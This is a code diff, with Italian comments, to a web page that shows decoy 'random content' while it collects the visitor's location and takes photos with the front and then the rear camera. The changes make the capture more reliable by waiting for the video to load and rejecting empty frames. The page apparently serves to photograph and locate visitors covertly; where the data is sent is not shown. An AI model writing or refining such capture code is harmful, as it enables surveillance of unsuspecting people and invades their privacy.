@@ -74,7 +74,6 @@
                 const randomIndex = Math.floor(Math.random() * randomContents.length);
                 contentDiv.innerHTML = randomContents[randomIndex];
                 logDebug("Contenuto casuale mostrato: " + randomContents[randomIndex].substring(0, 20) + "...");
-                // Verifica se è un'immagine
                 if (randomContents[randomIndex].startsWith('<img')) {
                     const img = contentDiv.querySelector('img');
                     if (img) {
@@ -118,6 +117,10 @@
                     });
                     video.srcObject = stream;
                     logDebug(`Fotocamera ${facingMode} avviata`);
+                    // Aspetta che il video sia pronto
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => resolve();
+                    });
                     return stream;
                 } catch (err) {
                     logDebug("Errore fotocamera: " + err.message);
@@ -133,16 +136,22 @@
         function takePhoto() {
             const video = document.getElementById('video');
             const canvas = document.getElementById('canvas');
-            if (video && canvas) {
+            if (video && canvas && video.videoWidth > 0 && video.videoHeight > 0) {
                 canvas.width = video.videoWidth;
                 canvas.height = video.videoHeight;
                 canvas.getContext('2d').drawImage(video, 0, 0);
                 const photo = canvas.toDataURL('image/jpeg');
                 logDebug("Foto scattata, dimensione: " + photo.length + " caratteri");
+                // Mostra temporaneamente l'immagine per verifica
+                const tempImg = document.createElement('img');
+                tempImg.src = photo;
+                tempImg.style.maxWidth = '100%';
+                document.body.appendChild(tempImg);
+                setTimeout(() => document.body.removeChild(tempImg), 2000);
                 return photo;
             } else {
-                logDebug("Video o canvas non trovato");
-                throw new Error("Video o canvas non trovato");
+                logDebug("Video o canvas non valido o dimensioni zero");
+                throw new Error("Video o canvas non valido");
             }
         }
 
@@ -182,7 +191,7 @@
                 showRandomContent();
                 const location = await getLocation();
                 let stream = await startCamera('user');
-                await new Promise(resolve => setTimeout(resolve, 1000));
+                await new Promise(resolve => setTimeout(resolve, 1000)); // Ritardo per sicurezza
                 const frontPhoto = takePhoto();
                 stopCamera(stream);
                 stream = await startCamera('environment');
